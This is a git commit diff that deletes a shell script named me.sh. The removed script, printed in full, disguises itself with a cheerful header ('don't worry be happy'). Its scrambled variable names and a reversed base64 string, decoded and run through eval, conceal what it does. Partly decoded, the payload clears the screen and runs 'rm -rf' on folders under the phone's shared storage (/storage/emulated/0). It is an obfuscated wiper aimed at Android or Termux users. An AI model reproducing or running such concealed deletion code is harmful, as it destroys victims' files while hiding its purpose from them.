8490b3ae05d6f2877784fb09cd8a9803e38c2580
K0NT0L <46758245+K0NT0L@users.noreply.github.com>
2019-02-11 21:24:00 +0700

    Delete me.sh

--- me.sh
+++
@@ -1,7 +0,0 @@
-# coded by Star >__<
-# don't worry be happy :)
-
-gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=IiIg8GajVmCyFWZsNmCv4Wai9CWJZURSBFJgYmctASbypAZl12LwBXYzRXYod1Lw8CZlRXYsVXbl9SZnFmcvR3cvAiZy1CItJnCzRnbl1Wdj9GRvAzLkVGdhxWdtV2LldWYy9Gdz9CImJXLg0mcKsWazVXbvAzLkVGdhxWdtV2LldWYy9Gdz9CImJXLg0mcK0USDR0Lw8CZlRXYsVXbl9SZnFmcvR3cvAiZy1CItJnCkF2bs52dvR0Lw8CZlRXYsVXbl9SZnFmcvR3cvAiZy1CItJnCyFWZsNmChlGZl12LwBXYzRXYod1LkJXYjR2cvAiZy1CItJnCyFWZsNmChlGZl12LwBXYzRXYod1Lw8CZlRXYsVXbl9SZnFmcvR3cvAiZy1CItJnCyFWZsNmCvEDZyF2YkN3LldWYy9Gdz9CImJXLg0mcKIXYlx2YK8CZyF2YkN3LldWYy9Gdz9CImJXLg0mcKIXYlx2YKImYv9CZp9mck5WYvAzLkVGdhxWdtV2LldWYy9Gdz9CImJXLg0mcKEGdhR2Lkl2byRmbh9CMvQWZ0FGb11WZvU2ZhJ3b0N3LgYmctASbypgchVGbjpwLw8CZlRXYsVXbl9SZnFmcvR3cvAiZy1CItJnCKIDIwVWZsNnCiAiLu4ibhdGIn5Wa0lWYXJCIvh2YlpgMgAXZlx2cKoAI0F2Ys9GbgwHIn5Wart2Y1ZkLy1EIkJXYk5WY0NHIm1CI0VGbp9GdKowc19Wb552buFEI5JGIkVGZvN2IKoAazFmYv4Waih3LtVGdzl3cvEyI
-' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
-x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
-eval "$N0q$x$Hc2$rQW"
